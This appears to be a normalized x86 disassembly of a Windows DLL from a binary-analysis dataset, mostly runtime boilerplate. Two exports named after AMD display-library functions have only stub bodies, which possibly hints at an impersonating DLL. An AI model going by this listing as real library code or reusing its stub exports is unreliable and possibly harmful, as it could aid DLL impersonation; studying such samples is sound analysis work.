mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
push esi
call sub_1007fa40
inc eax
push eax
call sub_1005f1fb
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_1007fbc0
pop ecx
pop ecx
test eax eax
je r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
push esi
push esi
call sub_1007fa40
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_10042442
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
mov edi [ ebp - 0x1c ]
call sub_1004aaad
mov [ eax ] edi
mov edi [ ebp - 0x24 ]
call sub_1003a35d
mov [ eax ] edi
mov edi [ ebp - 0x28 ]
call sub_10017cb8
mov [ eax ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10084af9
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push eax
call sub_1001b2d2
pop ecx
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_1003f2b0
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_10049cc0
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_1004aaad
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_1003a35d
mov [ eax ] esi
jmp r-xdata
inc esi
inc esi
push esi
call sub_1003f2b0
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_10084b90
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_10005412
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_10084be2
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_100579de
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push 0x9
call sub_1004929a
and [ esi ] 0x0
mov eax [ ebp - 0x4 ]
pop esi
sub edi esi
push eax
call sub_10065102
mov [ esi ] eax
add esi 0x4
mov eax [ edi + esi ]
pop ecx
test eax eax
jne r-xdata
sub_1008a6b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a66c
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
push esi
push r--data
mov ecx rw-data
call sub_10034100
mov [ ebp - 0x4 ] esi
push esi
xor eax eax
mov edi 0x7
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] ax
call sub_10034100
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
push esi
mov [ rw-data ] cx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
call sub_10034100
mov [ ebp - 0x4 ] 0x2
push esi
xor edx edx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] dx
call sub_10034100
mov [ ebp - 0x4 ] 0x3
push esi
xor eax eax
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] ax
call sub_10034100
mov [ ebp - 0x4 ] 0x4
xor ecx ecx
push esi
mov [ rw-data ] cx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
call sub_10034100
mov [ ebp - 0x4 ] 0x5
push esi
xor edx edx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] dx
call sub_10034100
push 0x206
xor eax eax
push esi
push rw-data
mov [ rw-data ] ax
call sub_1007f8f0
push 0x3cf0
push esi
push rw-data
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_1007f8f0
push 0x3cf0
push esi
push rw-data
call sub_1007f8f0
push 0x3c
push esi
push rw-data
call sub_1007f8f0
push 0x78
push esi
push rw-data
call sub_1007f8f0
push 0x78
push esi
push rw-data
call sub_1007f8f0
add esp 0x48
push 0x3cf0
push esi
push rw-data
call sub_1007f8f0
push 0x3cf0
push esi
push rw-data
call sub_1007f8f0
xor eax eax
push 0x208
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] ax
call sub_1007f8f0
push 0x208
push esi
push rw-data
call sub_1007f8f0
push 0x208
push esi
push rw-data
call sub_1007f8f0
push 0x208
push esi
push rw-data
call sub_1007f8f0
add esp 0x48
push 0x208
xor eax eax
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_1007f8f0
push 0x208
push esi
push rw-data
call sub_1007f8f0
push 0x208
push esi
push rw-data
call sub_1007f8f0
push 0x208
push esi
push rw-data
call sub_1007f8f0
push 0x1450
push esi
push rw-data
call sub_1007f8f0
push 0x1450
push esi
push rw-data
call sub_1007f8f0
add esp 0x48
push 0x1450
push esi
push rw-data
call sub_1007f8f0
push 0x1450
push esi
push rw-data
call sub_1007f8f0
push 0x208
push esi
push rw-data
mov [ rw-data ] esi
call sub_1007f8f0
push 0x208
push esi
push rw-data
call sub_1007f8f0
push 0x208
push esi
push rw-data
call sub_1007f8f0
push 0x208
xor eax eax
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_1007f8f0
add esp 0x48
push j_sub_1004c810
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_10064546
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1008aa70
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1002e3ac
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10032538
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10055e2a
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_1008aed0
mov [ edx + 0x15 ] al
call sub_10064546
add esp 0x4
mov esp ebp
pop ebp
retn
sub_1008aaf0
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1002e3ac
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10032538
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10055e2a
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_1008adb0
mov [ edx + 0x15 ] al
call sub_10064546
add esp 0x4
mov esp ebp
pop ebp
retn
sub_1008ab70
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1002e3ac
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10032538
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10055e2a
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_1008ae10
mov [ edx + 0x15 ] al
call sub_10064546
add esp 0x4
mov esp ebp
pop ebp
retn
sub_1008abf0
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1002e3ac
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10032538
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10055e2a
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_1008ae70
mov [ edx + 0x15 ] al
call sub_10064546
add esp 0x4
mov esp ebp
pop ebp
retn
sub_1008adb0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084e4a
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_10034060
mov ecx [ rw-data ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1008ae10
push ebp
mov ebp esp
push 0xffffffff
push sub_10084e7a
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_10034060
mov ecx [ rw-data ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1008ae70
push ebp
mov ebp esp
push 0xffffffff
push sub_10084eaa
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_10034060
mov ecx [ rw-data ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1008aed0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084eda
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_10034060
mov ecx [ rw-data ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1008af30
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_10072070
mov eax [ rw-data ]
push eax
call sub_1000a86e
add esp 0x14
sub_10001090
add ecx 0x4
jmp sub_100693b0
sub_100015e2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_100016ba
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100636ca
add esp 0xc
pop ebp
retn
sub_10001790
mov eax 0xffff
retn 0x4
sub_10001ffa
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10004c10
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000217d
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_10037434
pop ecx
sub_10002270
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_10002d83
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_10055e2a
int3
push eax
call sub_1000a86e
add esp 0x4
sub_1000306a
push 0xa
call sub_10037434
pop ecx
retn
sub_10003280
mov eax 0x1
retn 0x4
sub_10004833
mov edi edi
push ebp
mov ebp esp
call sub_1002d269
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_10004aa4
mov eax [ rw-data ]
retn
sub_10004d00
mov eax [ eax ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_10004d0f
mov [ ecx ] r--data
retn
sub_10005412
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1005e4f8
add esp 0x10
pop ebp
retn
sub_10005760
push ebp
mov ebp esp
pop ebp
jmp sub_10021090
sub_100068fb
push 0x0
call sub_10031e13
pop ecx
retn
sub_10006e70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] edx
pop ebp
retn
sub_10007c4b
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_10055e2a
int3
mov ecx esi
call sub_10063780
push esi
call sub_1000a86e
add esp 0x4
sub_1000833f
mov [ ecx ] r--data
jmp sub_1000fcc7
sub_10008650
mov al 0x1
retn
sub_100087a3
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_1003e294
push [ esi ]
call sub_1000a86e
pop ecx
pop ecx
pop esi
retn
sub_10008d33
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
j_sub_1000fcc7
jmp sub_1000fcc7
sub_100098f5
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10019274
push [ esi + 0x10 ]
call sub_10019274
push [ esi + 0x14 ]
call sub_10019274
add esp 0xc
pop esi
retn
sub_10009a5f
mov eax [ ecx + 0x1c ]
retn
sub_10009fc0
push ebp
mov ebp esp
pop ebp
jmp sub_1001b2d2
sub_10009fd0
push ebp
mov ebp esp
pop ebp
jmp sub_1002e3ac
sub_1000a239
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10004c10
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000a255
mov al [ ecx + 0xc ]
retn
sub_1000a3f0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x1c ]
push edi
mov edi [ ebp + 0x14 ]
push eax
call sub_1005bb10
pop edi
pop ebp
retn
j_sub_1000fcc7#2
jmp sub_1000fcc7
sub_1000a590
mov [ ecx ] r--data
jmp sub_1000fcc7
sub_1000a779
mov ecx [ ebp - 0x14 ]
call sub_100591cb
push 0x0
push 0x0
call sub_10055e2a
int3
sub_1000aa45
push ebx
call sub_1002e42c
pop ecx
retn
sub_1000ac80
mov eax 0xffff
retn
sub_1000ae68
mov ecx [ ebp - 0x28 ]
call sub_100262a0
xor ebx ebx
push ebx
push ebx
call sub_10055e2a
int3
sub_1000aec0
mov eax [ ecx - 0x10 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x10 ] r--data
retn
sub_1000b370
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_100448ba
add esp 0x8
pop ebp
retn 0x4
sub_1000b9af
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000b9c0
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x0
pop ebp
retn 0x4
sub_1000ba83
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_10055e2a
int3
call sub_1001f5c0
sub_1000c4a2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1000c56e
push ebx
call sub_1002e42c
pop ecx
retn
sub_1000d868
mov esi [ ebp + 0x8 ]
call sub_10030710
push 0x0
push 0x0
call sub_10055e2a
int3
j_sub_1004131f
jmp sub_1004131f
sub_1000fc1b
push ebx
call sub_1002e42c
pop ecx
retn
sub_1000fc30
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
retn
sub_1000fcc7
mov [ ecx ] r--data
jmp sub_10068d25
sub_10011250
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_10011cfe
mov ax [ ecx + 0xe ]
retn
sub_10012100
mov eax [ rw-data ]
xor ecx ecx
mov [ eax + 0xe8 ] ecx
mov [ eax + 0xf0 ] ecx
mov [ eax + 0xec ] 0x1
retn
sub_10012437
mov ecx [ ecx + 0x4 ]
call sub_1000c580
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10012450
mov eax [ ecx + 0x10 ]
push edi
push r--data
xor edi edi
call sub_100449d0
neg eax
sbb eax eax
neg eax
pop edi
retn
sub_1001279c
mov edx [ ebp - 0x14 ]
push edx
call sub_1000a86e
add esp 0x4
push 0x0
push 0x0
call sub_10055e2a
int3
sub_10013060
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10015c68
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10013a2a
mov edi edi
push ebp
mov ebp esp
call sub_1000c429
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
int3
push eax
call sub_10019794
pop ecx
sub_1001428d
push 0x6
call sub_10037434
pop ecx
retn
sub_10015a48
jmp r-xdata
cmp [ rw-data ] 0xa
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax * 4 + rw-data ]
inc [ rw-data ]
push eax
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_10015c60
mov eax 0x80004001
retn 0x8
sub_10016559
call [ TlsAlloc@IAT ]
retn 0x4
sub_10016910
or eax 0xffffffff
retn 0x4
sub_10017b90
add ecx 0x4
jmp sub_1002b4ee
sub_10017b98
xor eax eax
retn 0x14
sub_10017cb8
mov eax rw-data
retn
sub_10019414
push 0xa
call sub_10037434
pop ecx
retn
sub_100194d2
push 0xb
call sub_10037434
pop ecx
retn
sub_10019512
push 0x8
call sub_1002f3c9
pop ecx
retn
sub_10019712
push 0xd
call sub_10037434
pop ecx
retn
sub_10019f38
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_10019f45
mov eax [ ecx + 0x10 ]
retn
sub_1001ba2b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003d74d
add esp 0x14
pop ebp
retn
sub_1001c8b8
mov eax 0x1
retn
sub_1001cfa8
mov eax 0x1
retn
sub_1001d1b0
push ebp
mov ebp esp
pop ebp
jmp sub_1000a86e
sub_1001d1c0
mov eax 0x5
retn
sub_1001d9ff
xor eax eax
retn
sub_1001e12c
xor eax eax
inc eax
retn
sub_1001e130
mov esp [ ebp - 0x18 ]
call sub_10038c8a
sub_1001e420
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push 0xa
push edx
call sub_1001ba2b
add esp 0x10
pop ebp
retn
sub_1001e997
push 0x0
call sub_1006a4c4
pop ecx
retn
sub_1001e9a0
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x34 ]
mov eax [ ecx ]
cdq
retn
sub_1001ea2c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10032471
add esp 0x10
pop ebp
retn
sub_1001f3f0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
pop ebp
jmp sub_10009cf0
sub_1001f5c0
push esi
push 0x0
mov [ esi ] r--data
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
retn
sub_1001f911
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10024808
sub_1001fb21
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1004a920
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100207ea
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_10020f80
mov ax [ ecx + 0xe ]
retn
sub_10021071
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_100217d5
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_100609b0
sub_10021806
mov edi edi
push esi
call sub_1006e175
mov esi [ eax + 0x4 ]
call sub_1006a296
mov edx eax
mov eax esi
pop esi
retn
sub_10022054
xor eax eax
inc eax
retn
sub_10022058
mov esp [ ebp - 0x18 ]
call sub_10038c8a
sub_10022231
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_100223ad
mov ecx [ ebp - 0x14 ]
call sub_100591cb
push 0x0
push 0x0
call sub_10055e2a
int3
sub_10022580
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
retn
push eax
push 0x0
mov [ eax ] r--data
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10023916
push 0xd
call sub_10037434
pop ecx
retn
sub_10023940
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10027d03
pop ecx
pop ecx
pop ebp
retn
sub_10023ca4
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
call sub_1006164e
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
leave
retn 0x4
sub_10023cc0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebp
retn
call [ GetLastError@IAT ]
sub_10024678
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_10024690
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10015c68
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100246b0
mov eax [ ecx + 0x4 ]
retn
sub_10025990
mov eax esi
call sub_10054bf0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
retn
sub_100259b0
mov ecx [ eax + 0x4 ]
push ecx
call sub_1000a86e
pop ecx
retn
sub_100262c3
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
jmp sub_10008d33
sub_10026310
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
sub_100263e8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100263f7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_10026407
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10026510
push 0x0
call [ ExitProcess@IAT ]
int3
sub_10027385
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004bc30
add esp 0x10
pop ebp
retn
sub_1002741e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_10027710
xor eax eax
retn
sub_10027d90
push ecx
call [ VariantClear@IAT ]
retn
sub_10027dbb
mov al [ ecx + 0xd ]
retn
ADL_ADC_DrvDataToProfile_Copy
jmp sub_1002e320
sub_10028ea3
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_1001b2d2
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_10028fdb
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_10054cd2
pop ecx
retn
sub_10029172
push 0x5
pop eax
retn
sub_1002954a
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10015c68
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100298e0
mov eax 0x80004002
retn 0xc
sub_10029960
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_1003ad70
pop ebp
retn
sub_10029980
push ebp
mov ebp esp
push ecx
mov ecx [ rw-data ]
add ecx 0x1c
push esi
mov [ ebp - 0x4 ] 0x0
call sub_1000d7b0
mov eax esi
mov esp ebp
pop ebp
retn
sub_1002b2c6
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_1002b4ee
push [ ecx ]
call sub_1000c4a2
pop ecx
retn
sub_1002be70
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_1007f0fd
add esp 0xc
pop ebp
retn
sub_1002c4c0
xor al al
retn
ADL2_MMD_FeatureValuesX2_Set
push 0x0
call [ GetModuleHandleW@IAT ]
mov ecx [ eax + 0x3c ]
movzx eax [ ecx + eax + 0x3 ]
inc eax
retn
sub_1002ddc1
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10015c68
mov [ esi ] r--data
